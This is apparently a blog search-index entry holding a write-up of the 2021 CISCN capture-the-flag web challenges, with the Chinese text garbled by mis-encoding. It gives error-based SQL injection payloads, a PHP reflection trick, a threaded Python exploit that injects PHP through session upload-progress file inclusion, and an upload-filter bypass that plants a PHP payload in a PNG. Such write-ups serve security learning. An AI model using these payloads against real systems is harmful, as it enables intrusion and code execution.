<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2021_CISCN_WEB_WP</title>
      <link href="2021/05/15/2021-CISCN-WEB-WP/"/>
      <url>2021/05/15/2021-CISCN-WEB-WP/</url>
      
        <content type="html"><![CDATA[<p>å›½èµ›ã€‚</p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>æ— åˆ—åã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;) or extractvalue(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(id,no))c),0x7e)) %23</span><br><span class="line">1&#39;) or extractvalue(1,concat(0x7e,(select &#96;4a9ad912-9910-4909-82f4-0fe381be9798&#96; from flag),0x7e)) %23</span><br><span class="line">1&#39;) or extractvalue(1,concat(0x7e,(select substr((select &#96;4a9ad912-9910-4909-82f4-0fe381be9798&#96;  from flag),12)),0x7e)) %23</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;x4lPe-j6y1T-ThuQ3-Dhd30-ZlZSt-&#125;</span><br></pre></td></tr></table></figure><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>åŸé¢˜ï¼Œ<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p><p>swo æºç æ³„éœ²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">æœ¬é¢˜ç›®æ²¡æœ‰å…¶ä»–ä»£ç äº†å™¢ï¼Œå°±åªæœ‰è¿™ä¸€ä¸ªæ–‡ä»¶ï¼Œè™½ç„¶ä½ çœ‹åˆ°çš„ä¸å®Œå…¨ï¼Œä½†æ˜¯ä½ è§‰å¾—æˆ‘ä¼šæŠŠflagè—åœ¨å“ªé‡Œå‘¢ï¼Œä»”ç»†æƒ³æƒ³æ–‡ä»¶é‡Œé¢è¿˜æœ‰ä»€ä¹ˆï¼Ÿ</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);</span><br><span class="line">var_dump(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure><p>çŒœæµ‹ flag è—åœ¨ç±»æ³¨é‡Šä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ php å†…ç½®ç±» <code>ReflectionMethod</code> çš„ <code>getDocComment</code> å‡½æ•°æ¥è¯»å– User ç±»ä¸­å„ä¸ªå‡½æ•°çš„æ³¨é‡Šï¼Œå¯ä»¥æ„é€ ï¼š <code>?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code>ï¼ˆè¿™é‡Œç”¨ <code>__toString</code> ä¹Ÿå½³äºï¼‰</p><p>é€ä¸ªå‡½æ•°çˆ†ç ´ï¼š</p><p><img src="https://i.loli.net/2021/05/15/uEINUml17zMovrd.png"></p><p>flag åœ¨ q é‡Œé¢ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;TpVpe-HP8w2-3kFCF-4EZTO-hyAy0-&#125;</span><br></pre></td></tr></table></figure><h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p>.listing ä¿¡æ¯æœé›†ï¼Œsession.upload_progress æ–‡ä»¶åŒ…å«åˆ©ç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">sessid = <span class="string">&#x27;233333333333&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cf&quot;</span>: <span class="string">f&quot;../../../../../var/lib/php/sessions/acafaecced/sess_<span class="subst">&#123;sessid&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27; &#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://123.60.215.249:25900/&#x27;</span>,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php var_dump(readfile(&quot;/etc/acgfdffhbd/gfediefagf/hedbfegbjb/eegcbdabad/ibadcafecb/fl444444g&quot;)); ?&gt;&#x27;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;help.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line">        <span class="comment"># resp = session.post(&#x27;http://123.60.215.249:25900/&#x27;, data=&#123; &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php var_dump(</span></span><br><span class="line">        <span class="comment"># scandir(&quot;/etc/acgfdffhbd/gfediefagf/hedbfegbjb/eegcbdabad/ibadcafecb/&quot;)); ?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;help.txt&#x27;,</span></span><br><span class="line">        <span class="comment"># f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;) </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://123.60.215.249:25900/&#x27;</span>, data=data)</span><br><span class="line">        <span class="built_in">print</span>(resp.text)</span><br><span class="line">        event.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><p>flagï¼šCISCN{FhDKa-MuU0P-FJ9lj-MsZcg-6hXCa-}</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>example.php æºç æ³„éœ²ã€‚</p><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imageinfo</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¦‚æœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span>[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŒ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fileName</span>=urldecode(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$fileName</span>,<span class="string">&quot;c&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;i&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;h&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;ph&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸Šå»çš„è¯é‚£å¯ä¸å¾—äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imagePath</span> = <span class="string">&quot;image/&quot;</span> . mb_strtolower(<span class="variable">$fileName</span>);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;postedFile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$imagePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;upload success, image at <span class="subst">$imagePath</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä¼ éƒ½æ²¡æœ‰ä¼ ä¸Šå»&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>example.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;poc&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    <span class="variable">$name_for_zip</span> = <span class="string">&quot;example/&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>)[count(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>))-<span class="number">1</span>]!==<span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;open(<span class="variable">$name_for_zip</span>) !== <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;éƒ½ä¸èƒ½è§£å‹å‘¢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ&quot;</span>;</span><br><span class="line">    <span class="variable">$pos_for_zip</span> = <span class="string">&quot;/tmp/example/&quot;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;extractTo(<span class="variable">$pos_for_zip</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;close();</span><br><span class="line">    unlink(<span class="variable">$name_for_zip</span>);</span><br><span class="line">    <span class="variable">$files</span> = glob(<span class="string">&quot;<span class="subst">$pos_for_zip</span>/*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$first</span> = imagecreatefrompng(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$size</span> = min(imagesx(<span class="variable">$first</span>), imagesy(<span class="variable">$first</span>));</span><br><span class="line">        <span class="variable">$second</span> = imagecrop(<span class="variable">$first</span>, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$size</span>, <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$size</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$second</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$final_name</span> = pathinfo(<span class="variable">$file</span>)[<span class="string">&quot;basename&quot;</span>];</span><br><span class="line">            imagepng(<span class="variable">$second</span>, <span class="string">&#x27;example/&#x27;</span>.<span class="variable">$final_name</span>);</span><br><span class="line">            imagedestroy(<span class="variable">$second</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy(<span class="variable">$first</span>);</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨è¿™ä¸ªè¿‡ getimagesizeï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br></pre></td></tr></table></figure><p>ç”¨ %C4%B0 é€šè¿‡ mb_strtolower urldecode ç»•è¿‡ i çš„è¿‡æ»¤ã€‚åˆ©ç”¨ <a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/">https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</a> ç»•è¿‡å›¾ç‰‡æ£€æŸ¥ã€‚</p><p>ä¿®æ”¹ä¸€ä¸‹è„šæœ¬ï¼Œå°† generate.py ä¸­çš„å€¼å–å‡ºæ¥ï¼š</p><p><img src="https://i.loli.net/2021/05/16/UQ64A82S5huXOWT.png"></p><p>ä¸¢åˆ° 010 é‡Œé¢æ”¹ä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/05/16/d7v28UgwFLkjrfO.png"></p><p>å†è½¬å›å»ï¼š</p><p><img src="https://i.loli.net/2021/05/16/IS7vtUhoXAELsBl.png"></p><p>æœ€åä¿®æ”¹è„šæœ¬é‡Œçš„å€¼ï¼Œç”Ÿæˆå›¾ç‰‡ğŸï¼š<code>python generate.py -m php -o a.png</code></p><p>ç„¶åå®Œäº‹äº†ï¼Œåé¢çš„è‡ªè¡Œè„‘è¡¥ã€‚</p><h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><p>Yii2 æ¡†æ¶é“¾å­ï¼Œä¸ä¼šï¼Œç­‰ guoke å’Œèµµæ€»å¸¦å¸¦äº†ã€‚</p><h2 id="babyblog"><a href="#babyblog" class="headerlink" title="babyblog"></a>babyblog</h2><p>/templates/ ä¸‹æºç æ³„éœ²ã€‚</p><h2 id="toktok"><a href="#toktok" class="headerlink" title="toktok"></a>toktok</h2><p>```<br>POST /admin<br>username=admin&amp;password=admin</p><p>è·å¾—ä¸€ä¸ª VPN çš„ apkï¼Œé€†å‘ï¼Ÿ</p>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_KCTF_WEB_WP</title>
      <link href="2021/05/14/2021-KCTF-WEB-WP/"/>
      <url>2021/05/14/2021-KCTF-WEB-WP/</url>
      
